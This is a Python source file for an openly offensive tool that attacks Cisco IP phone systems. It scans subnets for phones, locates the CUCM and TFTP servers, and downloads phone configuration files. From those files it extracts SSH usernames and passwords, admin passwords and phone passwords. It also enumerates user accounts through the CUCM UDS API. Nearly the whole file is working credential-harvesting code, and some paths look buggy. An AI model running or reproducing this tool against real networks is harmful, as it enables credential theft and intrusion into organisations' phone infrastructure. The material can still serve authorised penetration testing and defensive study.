#!/usr/bin/env python3
import argparse
import requests
import re
import ipaddress
import socket
import string
from bs4 import BeautifulSoup
from alive_progress import alive_bar
import tftpy

requests.packages.urllib3.disable_warnings()

def banner():
    print(
'''
___________
                   /.---------.\`-._                            
                  //          ||    `-._                            
                  || `-._     ||        `-._                        
                  ||     `-._ ||            `-._                            
                  ||    _____ ||`-._            \                       
            _..._ ||   | __ ! ||    `-._        |                           
          _/     \||   .'  |~~||        `-._    |                           
      .-``     _.`||  /   _|~~||    .----.  `-._|                       
     |      _.`  _||  |  |23| ||   / :::: \    \                        
     \ _.--`  _.` ||  |  |56| ||  / ::::: |    |                        
      |   _.-`  _.||  |  |79| ||  |   _..-'   /                     
      _\-`   _.`O ||  |  |_   ||  |::|        |                 
    .`    _.`O `._||  \    |  ||  |::|        |             
 .-`   _.` `._.'  ||   '.__|--||  |::|        \             
`-._.-` \`-._     ||   | ":  !||  |  '-.._    |             
         \   `--._||   |_:"___||  | ::::: |   |
          \  /\   ||     ":":"||   \ :::: |   |
           \(  `-.||       .- ||    `.___/    /
           |    | ||   _.-    ||              |
           |    / \\.-________\\____.....-----'
           \    -.      \ |         |
            \     `.     \ \        | 
 __________  `.    .'\    \|        |\  _________
    SeeYouCM   `..'   \    |        | \   Thief     
                \\   .'    |       /  .`.
                | \.'      |       |.'   `-._
                 \     _ . /       \_\-._____)
                  \_.-`  .`'._____.'`.
                    \_\-|             |
                         `._________.'
'''
 )


def enumerate_phones_subnet(input):
    hosts = []
    if '/' in input:
        subnet = ipaddress.IPv4Interface(input).network
        for host in subnet.hosts():
            mac = None
            url = 'http://{host}/NetworkConfiguration'.format(host=host)
            try:
                r = requests.head(url, verify=False, timeout=3)
                if re.match("^[2]\d\d$", str(r.status_code)):
                    http_response = requests.get(url)
                    phone_hostname = re.search(r'Host name.*(SEP[A-F0-9]{12})',http_response.text,re.IGNORECASE).group(1)
                    filename = "{phone_hostname}.cnf.xml".format(phone_hostname=phone_hostname)
                    cucm_host = parse_cucm(http_response.text)
                    tftp_hosts = parse_tftp(http_response.text)
                    return_url = 'http://{cucm_host}:6970/{filename}'.format(cucm_host=cucm_host,filename=filename)
                    phone_object = {"ip": host, "hostname": phone_hostname, "url": return_url, "tftp_hosts": tftp_hosts}
                    hosts.append(phone_object)
                    print('[*] - Found Phone {phone_hostname} - IP {host}'.format(phone_hostname=phone_hostname,host=host))
            except Exception as e:
                pass
        return hosts
    return None

def parse_cucm(html):
    cucm = re.search(r'<b>(\S+)\ +Active',html,re.IGNORECASE)
    if cucm is None:
        return None
    else:
        if cucm.group(1):
            return cucm.group(1).replace('&#x2D;','-')

def parse_tftp(html):
    tftp = re.search(r'TFTP Server 1</B></TD><td width=20></TD><TD><B>(\S+)</b>',html,re.IGNORECASE)
    tftp2 = re.search(r'TFTP Server 2</B></TD><td width=20></TD><TD><B>(\S+)</b>',html,re.IGNORECASE)
    servers = []
    if tftp is not None and tftp.group(1):
        servers.append(tftp.group(1).replace('&#x2D;','-'))
    if tftp2 is not None and tftp2.group(1):
        servers.append(tftp2.group(1).replace('&#x2D;','-'))
    return servers

def parse_subnet(html):
    html = html.replace('\n','').replace('\r','')
    subnet_mask = re.search(r'Subnet Mask\ ?</B></TD>\r?\n?\ *(?:<td width="?20"?></TD>)?\r?\n?<TD><B>([12]?[0-9]?[0-9]\.[12]?[0-9]?[0-9]\.[12]?[0-9]?[0-9]\.[12]?[0-9]?[0-9])</B>',html.strip(),re.IGNORECASE)
    if subnet_mask is None:
        return None
    else:
        if subnet_mask.group(1):
            return subnet_mask.group(1)

def get_hostname_from_phone(phone):
    url = "http://{0}/CGI/Java/Serviceability?adapter=device.statistics.device".format(phone)
    __http_response = requests.get(url)
    if __http_response.status_code == 404:
        if verbose:
            print('Config file not found on HTTP Server: {0}'.format(phone))
    else:
        lines = __http_response.text
    return parse_phone_hostname(lines)

def parse_phone_hostname(html):
    html = html.replace('\n','').replace('\r','')
    hostname = re.search(r'(SEP[a-z0-9]{12})',html.strip(),re.IGNORECASE)
    if hostname is None:
        return None
    else:
        if hostname.group(1):
            return hostname.group(1)

def parse_filename(html):
    html = html.replace('\n','').replace('\r','')
    filename = re.search(r'(?<!ram\\)((?:SEP|CIP)\S+\.cnf.xml)',html.strip(),re.IGNORECASE)
    if filename is None:
        return None
    else:
        if filename.group(1):
            return filename.group(1)

def hostname_resolves(hostname):
    try:
        socket.gethostbyname(hostname)
        return 1
    except socket.error:
        return 0

def get_cucm_name_from_phone(phone):
    url = 'http://{phone}/CGI/Java/Serviceability?adapter=device.statistics.configuration'.format(phone=phone)
    try:
        __http_response = requests.get(url, timeout=2)
        if __http_response.status_code == 404:
            url = 'http://{phone}/NetworkConfiguration'.format(phone=phone)
            __http_response = requests.get(url)
        return parse_cucm(__http_response.text)
    except Exception as e:
        pass

def get_tftp_hosts_from_phone(phone):
    url = 'http://{phone}/CGI/Java/Serviceability?adapter=device.statistics.configuration'.format(phone=phone)
    try:
        __http_response = requests.get(url, timeout=2)
        if __http_response.status_code == 404:
            url = 'http://{phone}/NetworkConfiguration'.format(phone=phone)
            __http_response = requests.get(url)
        return parse_tftp(__http_response.text)
    except Exception as e:
        pass

def get_file_tftp(host, file, outfile):
    client = tftpy.TftpClient(host, 69)
    client.download(file, outfile)


def get_phones_hostnames_from_reverse(input):
    hostnames = []
    phone_hostnames = []
    if '/' in input:
        subnet = ipaddress.IPv4Interface(input).network
    else:
        url = 'http://{phone}/CGI/Java/Serviceability?adapter=device.statistics.configuration'.format(phone=input)
        __http_response = requests.get(url, timeout=2)
        if __http_response.status_code == 404:
            url = 'http://{phone}/NetworkConfiguration'.format(phone=phone)
            __http_response = requests.get(url)
        subnet_mask = parse_subnet(__http_response.text)

        if re.search(r'Cisco Unified IP Phone Cisco Communicator',__http_response.text,re.IGNORECASE):
            pass
        else:
            subnet = ipaddress.IPv4Interface(u'{phone}/{subnet_mask}'.format(phone=input, subnet_mask=subnet_mask)).network
            phone_hostname = re.search(r'Host name.*(SEP[A-F0-9]{12})',__http_response.text,re.IGNORECASE).group(1)
            if phone_hostname:
                hostnames.append(phone_hostname)
            for host in subnet.hosts():
                try:
                    hostnames.append(socket.gethostbyaddr(host.exploded)[0])
                except socket.herror:
                    pass
    for line in hostnames:
        host = re.search(r'SEP[0-9A-F]{12}',line,re.IGNORECASE)
        if host is not None:
            phone_hostnames.append(host.group(0))
    if phone_hostnames == []:
        return None
    else:
        return phone_hostnames

def get_config_names(CUCM_host, TFTP_hosts, hostnames=None, tftp=False):
    config_names = []
    if hostnames is None:

        lines = []
        try:
            if tftp:
                for tftp_host in TFTP_hosts:
                    get_file_tftp(tftp_host, "ConfigFileCacheList.txt", tftp_host+"-ConfigFileCacheList.txt")
                    lines += open(tftp_host+"-ConfigFileCacheList.txt").readlines()
                print(len(lines))
            else:
                url = "http://{0}:6970/ConfigFileCacheList.txt".format(CUCM_host)
                __http_response = requests.get(url, timeout=2)
                if __http_response.status_code != 404:
                    lines = __http_response.text.split('\n')

            for line in lines:
                match = re.match(r'((?:CIP|SEP)[0-9A-F]{12}\S+)',line.strip(), re.IGNORECASE)
                if match:
                    config_names.append(match.group(1))

        except Exception as e:
            server = CUCM_host
            if tftp: 
                server = TFTP_hosts[0]
            print('Server {} is not responding'.format(server))
    else:
        for host in hostnames:
            config_names.append('{host}.cnf.xml'.format(host=host))
    if config_names == []:
        return None
    else:
        return config_names

def get_users_api(CUCM_host):
    usernames = []
    base_url = f'https://{CUCM_host}:8443/cucm-uds/users?name='
    try:
        with alive_bar(676, title="> Identifying Users  ", ) as prog_bar:
            for char1 in string.ascii_lowercase:
                for char2 in string.ascii_lowercase:
                    prog_bar()
                    url = base_url+char1+char2
                    __http_response = requests.get(url, timeout=2,verify=False)
                    if __http_response.status_code != 404:
                        lines = __http_response.text
                        soup = BeautifulSoup(lines, 'lxml')
                        for user in soup.find_all('username'):
                            usernames.append(user.text + "\n")
    except requests.exceptions.ConnectionError:
        print('CUCM Server {} is not responding'.format(CUCM_host))
    return usernames

def get_version(CUCM_host):
    base_url = f'https://{CUCM_host}:8443/cucm-uds/version'
    try:
        __http_response = requests.get(base_url, timeout=2,verify=False)
        if __http_response.status_code != 404:
            lines = __http_response.text
            soup = BeautifulSoup(lines, 'lxml')
            cucm_version = soup.findAll('version')[0].text
            print(f'CUCM is running version {cucm_version}')
    except requests.exceptions.ConnectionError:
        print('CUCM Server {} is not responding'.format(CUCM_host))
    return

def search_for_secrets(CUCM_host, TFTP_hosts, filename, tftp=False):
    global found_credentials
    global found_usernames
    lines = []
    user = str()
    user2 = str()
    password = str()

    try:
        if tftp:
            for tftp_host in TFTP_hosts:
                get_file_tftp(tftp_host, filename, tftp_host+"-"+filename)
                lines += open(tftp_host+"-"+filename).readlines()
        else: 
            url = "http://{0}:6970/{1}".format(CUCM_host,
                                            filename)
            __http_response = requests.get(url, timeout=10)
            if __http_response.status_code == 404:
                if verbose:
                    print('Config file not found on HTTP Server: {0}'.format(filename))
            else:
                lines = __http_response.text.split('\n')

        for line in lines:
            match = re.search(r'(<sshUserId>(\S+)</sshUserId>|<sshPassword>(\S+)</sshPassword>|<userId.*>(\S+)</userId>|<adminPassword>(\S+)</adminPassword>|<phonePassword>(\S+)</phonePassword>)',line)
            if match:
                if match.group(2):
                    user = match.group(2)
                    found_usernames.append((user,filename))
                if match.group(3):
                    password = match.group(3)
                    found_credentials.append((user,password,filename))
                if match.group(4):
                    user2 = match.group(4)
                    found_usernames.append((user2,filename))
                if match.group(5):
                    user2 = match.group(5)
                    found_credentials.append(('unknown',password,filename))
        if verbose:
            if user and password:
                print('{0}\t{1}\t{2}'.format(filename,user,password))
            elif user:
                print('SSH Username is {0} password was not set in {1}'.format(user,filename))
            elif password:
                print('SSH Username is not set, but password is {0} in {1}'.format(password,filename))
            elif user2:
                print('Possible AD username {0} found in config {1}'.format(user2,filename))
            else:
                if verbose:
                    print('Username and password not set in {0}'.format(filename.strip()))
    except Exception as e:
        server = CUCM_host.strip() 
        if tftp:
            server = TFTP_hosts[0].strip()
        print("Could not connect to {server}".format(server=server))

if __name__ == '__main__':
    banner()
    global found_usernames
    global found_credentials

    parser = argparse.ArgumentParser(description='Penetration Toolkit for attacking Cisco Phone Systems by stealing credentials from phone configuration files')
    parser.add_argument('-H','--host', default=None, type=str, help='IP Address of Cisco Unified Communications Manager')
    parser.add_argument('--userenum', action='store_true', default=False, help='Enable user enumeration via UDS API')
    parser.add_argument('-p','--phone', type=str, help='IP Address of a Cisco Phone')
    parser.add_argument('-s','--subnet', type=str, help='IP Address of a Cisco Phone')
    parser.add_argument('-v','--verbose', action='store_true', default=False, help='Enable Verbose Logging')
    parser.add_argument('-e','--enumsubnet', type=str, help='IP Subnet to enumerate and pull credentials from in CIDR format x.x.x.x/24')
    parser.add_argument('--tftp', action='store_true', default=False, help='Pull files via TFTP')

    args = parser.parse_args()

    CUCM_host = args.host
    TFTP_host = None
    phone = args.phone
    subnet = args.subnet
    verbose = args.verbose
    enumsubnet = args.enumsubnet
    found_credentials = []
    found_usernames = []
    file_names = ''
    hostnames = []

    get_version(CUCM_host)

    if enumsubnet:
        hosts = enumerate_phones_subnet(enumsubnet)
        for host in hosts:
            found_credentials.clear()
            found_usernames.clear()
            if CUCM_host is None:
                CUCM_host = get_cucm_name_from_phone(host["ip"])
            if hostname_resolves(CUCM_host):
                file_names = get_config_names(CUCM_host, host["tftp_hosts"], hostnames=[host["hostname"]], tftp=args.tftp)
                for file in file_names:
                    server = CUCM_host
                    if args.tftp:
                        server = host["tftp_hosts"]
                    print('Connecting to {server} and getting config for {host}/{hostname}'.format(server=server,host=host["ip"],hostname=host["hostname"].strip()))
                    search_for_secrets(CUCM_host, host["tftp_hosts"], file, tftp=args.tftp)
                if found_credentials != []:
                    print('Credentials Found in Configurations!')
                for cred in found_credentials:
                    print('{0}\t{1}\t{2}'.format(cred[0],cred[1],cred[2]))
                if found_usernames != []:
                    print('Usernames Found in Configurations!')
                for usernames in found_usernames:
                    print('{0}\t{1}'.format(usernames[0],usernames[1]))
            print("")
        quit(0)
    elif phone:
        if args.host is None:
            CUCM_host = get_cucm_name_from_phone(phone)
            TFTP_hosts = get_tftp_hosts_from_phone(phone)
        else:
            CUCM_host = args.host
            TFTP_hosts = [args.host]
        if CUCM_host is None:
            print('Unable to automatically detect the CUCM Server. Please specify the CUCM server')
            quit(1)
        else:
            print('The detected IP address/hostname for the CUCM server is {}'.format(CUCM_host))
    elif args.host:
        CUCM_host = args.host
        TFTP_hosts = [args.host]
    else:
        print('You must enter either a phone IP address or the IP address of the CUCM server')
        quit(1)
    file_names = get_config_names(CUCM_host, TFTP_hosts, tftp=args.tftp)
    if file_names is None:
        if phone:
            hostnames = [get_hostname_from_phone(phone)]
            hostnames += get_phones_hostnames_from_reverse(phone)

        if subnet:
            if hostnames == []:
                hostnames = get_phones_hostnames_from_reverse(subnet)
            else:
                _hostnames = get_phones_hostnames_from_reverse(subnet)
                if _hostnames:
                    for host in _hostnames:
                        hostnames.append(host.rstrip())
        if hostnames == []:
            file_names = get_config_names(CUCM_host, TFTP_hosts, tftp=args.tftp)
        else:
            file_names = get_config_names(CUCM_host, TFTP_hosts, hostnames=hostnames, tftp=args.tftp)

    if file_names is None:
        print('Unable to detect file names from CUCM, or no viable targets exits in ConfigFileCacheList.txt')
    else:
        for file in file_names:
            search_for_secrets(CUCM_host,file)

    if found_credentials != []:
        print('Credentials Found in Configurations!')
        for cred in found_credentials:
            print('{0}\t{1}\t{2}'.format(cred[0],cred[1],cred[2]))

    if found_usernames != []:
        print('Usernames Found in Configurations!')
        for usernames in found_usernames:
            print('{0}\t{1}'.format(usernames[0],usernames[1]))
    if args.userenum:
        print('Getting users from UDS API.')
        #each API call is limited by default to 64 users per request
        api_users = get_users_api(CUCM_host)
        if api_users != []:
            unique_users = set(api_users)
            api_users = list(unique_users)
            with open('./cucm_users.txt', mode='w') as outfile:
                for line in api_users:
                    outfile.writelines(line)
            print(f'The following {len(api_users)} users were identified from the UDS API')

            for username in api_users:
                print('{0}'.format(username))

